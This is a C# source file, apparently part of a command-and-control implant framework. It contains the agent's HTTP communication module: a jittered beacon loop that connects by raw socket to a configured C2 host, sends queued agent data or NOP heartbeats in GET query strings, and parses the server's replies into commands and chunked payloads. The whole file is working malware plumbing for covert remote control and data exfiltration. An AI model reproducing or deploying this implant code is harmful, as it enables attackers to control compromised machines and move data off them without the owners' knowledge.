using System;
using System.Net;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Text.RegularExpressions;

using Agent.Models;
using Agent.Interfaces;
using Agent.Controllers;

namespace Agent.Modules
{
    internal class HTTPCommModule : ICommModule
    {
        protected ConfigurationController configurationController;
        protected AgentStatus agentStatus;

        protected Socket socket;
        protected Queue<C2Data> inboundQueue = new Queue<C2Data>();
        protected Queue<C2Data> outboundQueue = new Queue<C2Data>();
        protected string cache;

        public void Initialise(ConfigurationController configController)
        {
            configurationController = configController;
        }

        public void Run()
        {
            agentStatus = AgentStatus.Running;

            Task.Factory.StartNew(delegate()
            {
                while (agentStatus == AgentStatus.Running)
                {
                    var sleep = (int)configurationController.GetOption(ConfigurationSettings.SleepTime) * 1000;
                    var jitter = (int)configurationController.GetOption(ConfigurationSettings.Jitter);
                    var rnd = new Random();
                    var diff = rnd.Next((int)Math.Round(sleep * (jitter / 100.00)));
                    if (rnd.Next(2) == 0) { diff = -diff; }
                    Thread.Sleep(sleep + diff);
                    DoStuff();
                }
            });
        }

        public void SendData(C2Data c2Data)
        {
            outboundQueue.Enqueue(c2Data);
        }

        public bool RecvData(out C2Data c2Data)
        {
            if (inboundQueue.Count > 0)
            {
                c2Data = inboundQueue.Dequeue();
                return true;
            }

            c2Data = null;
            return false;
        }

        public void Stop()
        {
            agentStatus = AgentStatus.Stopped;
        }

        private void DoStuff()
        {
            C2Data c2Data;

            if (outboundQueue.Count > 0)
                c2Data = outboundQueue.Dequeue();
            else
                // send NOP
                c2Data = new C2Data() { Module = "Core", Command = "NOP", AgentId = (string)configurationController.GetOption(ConfigurationSettings.AgentId) };

            // Send C2Data to HTTP Server
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
            var buffer = new byte[socket.ReceiveBufferSize];
            try
            {
                socket.Connect(new IPEndPoint(IPAddress.Parse((string)configurationController.GetOption(ConfigurationSettings.C2Host)), (int)configurationController.GetOption(ConfigurationSettings.C2Port)));
                socket.Send(Encoding.ASCII.GetBytes(string.Format("GET /?module={0}&command={1}&data={2}&agentid={3} HTTP/1.1\r\n\r\n", c2Data.Module, c2Data.Command, c2Data.Data, c2Data.AgentId)));
                socket.Receive(buffer);
                socket.Close();
            }
            catch { return; }
            
            // Parse the response from the HTTP request into a C2Data object
            var match = Regex.Match(Encoding.ASCII.GetString(buffer), "module=([^&]+)&command=([^&]+)&data=([^&]+)?&id=([^&]+)&final=([^\\s\0]+)", RegexOptions.Multiline);
            if (match.Success)
            {
                var newc2Data = new C2Data()
                {
                    Module = match.Groups[1].Value,
                    Command = match.Groups[2].Value,
                };
                
                cache += match.Groups[3].Value;

                if (match.Groups[5].Value.Equals("true", StringComparison.OrdinalIgnoreCase))
                {
                    newc2Data.Data = cache;
                    inboundQueue.Enqueue(newc2Data);
                    cache = string.Empty;
                }
            }
        }
    }
}